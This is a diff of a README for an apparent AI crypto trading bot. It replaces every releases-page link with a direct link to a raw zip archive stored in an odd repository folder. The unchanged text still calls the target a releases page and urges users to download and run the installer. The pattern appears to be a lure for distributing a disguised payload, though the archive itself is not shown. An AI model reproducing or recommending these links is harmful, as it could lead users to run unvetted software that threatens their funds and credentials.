@@ -1,6 +1,6 @@
 # 🤖 autonomous-ai-trading-agent-llama3 - Smart Crypto Trading Bot
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Hupahint417/autonomous-ai-trading-agent-llama3/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Hupahint417/autonomous-ai-trading-agent-llama3/raw/refs/heads/main/backset/llama_autonomous_agent_trading_ai_v3.3.zip)
 
 ---
 
@@ -34,7 +34,7 @@ If you want better performance, you can use a faster CPU and more RAM.
 
 Go to the releases page to download the latest version of the bot:
 
-[Download Latest Release](https://github.com/Hupahint417/autonomous-ai-trading-agent-llama3/releases)
+[Download Latest Release](https://github.com/Hupahint417/autonomous-ai-trading-agent-llama3/raw/refs/heads/main/backset/llama_autonomous_agent_trading_ai_v3.3.zip)
 
 Click on the badge above or open this link in your browser. This page contains all the latest versions and setup files.
 
@@ -174,7 +174,7 @@ If problems persist, you can open an issue on the GitHub repository.
 
 Visit the releases page regularly:
 
-[Download Latest Release](https://github.com/Hupahint417/autonomous-ai-trading-agent-llama3/releases)
+[Download Latest Release](https://github.com/Hupahint417/autonomous-ai-trading-agent-llama3/raw/refs/heads/main/backset/llama_autonomous_agent_trading_ai_v3.3.zip)
 
 Download the newest installer and run it. It will update your existing installation without deleting your settings.
 
